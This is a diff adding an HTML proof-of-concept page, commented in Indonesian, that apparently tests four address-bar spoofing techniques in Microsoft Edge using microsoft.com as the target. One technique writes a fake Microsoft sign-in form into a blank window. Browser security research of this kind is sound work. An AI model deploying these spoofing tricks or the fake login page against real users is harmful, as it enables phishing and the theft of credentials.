@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Edge Spoof — Real Target Test</title></head>
+<body>
+<h3>Real Address Bar Spoof Test — Target: microsoft.com</h3>
+<p>Ini bukan window.open+redirect. Ini test apakah address bar bisa ditipu
+dengan kombinasi history API + alert + fullscreen.</p>
+<hr>
+<button onclick="spoof1()">Teknik A: history.replaceState + alert</button>
+<button onclick="spoof2()">Teknik B: location.hash + fullscreen</button>
+<button onclick="spoof3()">Teknik C: document.open + write</button>
+<button onclick="spoof4()">Teknik D: meta refresh + back</button>
+<hr>
+<pre id="log" style="font-size:12px;"></pre>
+<script>
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+
+// Teknik A: replaceState ke URL target, lalu alert (browser mungkin
+// tampilkan URL target di address bar saat alert muncul)
+function spoof1(){
+  log('Teknik A: history.replaceState + alert()');
+  log('  -> replaceState ke https://microsoft.com/');
+  try {
+    history.replaceState(null, '', 'https://microsoft.com/');
+  } catch(e) { log('  -> Error: ' + e.message); }
+  log('  -> alert() sekarang. CEK address bar saat alert muncul!');
+  alert('Test: address bar nunjukin apa?');
+  log('  -> Alert closed. Address bar sekarang: ' + location.href);
+}
+
+// Teknik B: hash manipulasi + fullscreen (address bar mungkin
+// tampilkan URL dengan hash yang misleading)
+function spoof2(){
+  log('Teknik B: location.hash + fullscreen');
+  log('  -> hash = #https://microsoft.com');
+  location.hash = '#https://microsoft.com';
+  log('  -> requestFullscreen');
+  try { document.documentElement.requestFullscreen(); } catch(e){}
+  log('  -> CEK address bar: apakah tampil microsoft.com?');
+}
+
+// Teknik C: document.open + document.write (bisa manipulasi
+// halaman tanpa navigasi, address bar tidak berubah)
+function spoof3(){
+  log('Teknik C: document.open + document.write');
+  log('  -> Rewrite halaman tanpa navigasi (address bar tetap sama)');
+  var w = window.open('', '_blank');
+  if (!w) { log('  -> window.open blocked'); return; }
+  log('  -> Window baru address bar: about:blank');
+  log('  -> document.write konten microsoft-looking');
+  w.document.open();
+  w.document.write('<html><head><title>Microsoft Login</title></head><body style="font-family:Segoe UI,sans-serif;text-align:center;padding:50px"><h1>Sign in to Microsoft</h1><p>Enter your email</p><input style="padding:8px;width:300px" placeholder="Email"><br><br><button style="padding:8px 24px;background:#0078d4;color:#fff;border:none;border-radius:4px">Next</button></body></html>');
+  w.document.close();
+  log('  -> CEK: address bar = about:blank, konten = Microsoft login');
+  log('  -> Ini bukan bug spoof (about:blank = benar). Tapi cek apakah');
+  log('     address bar bisa dimanipulasi lebih lanjut.');
+}
+
+// Teknik D: meta refresh + history.back (race condition:
+// halaman baru load tapi address bar belum update saat back dipanggil)
+function spoof4(){
+  log('Teknik D: meta refresh + history.back race');
+  log('  -> Buka window ke microsoft.com (slow load)');
+  var w = window.open('https://www.microsoft.com/', '_blank');
+  log('  -> Tunggu 200ms lalu history.back()');
+  setTimeout(function(){
+    try { w.history.back(); } catch(e){ log('  -> back error: ' + e.message); }
+    log('  -> CEK address bar window baru: masih microsoft.com atau berubah?');
+  }, 200);
+}
+</script>
+</body>
+</html>
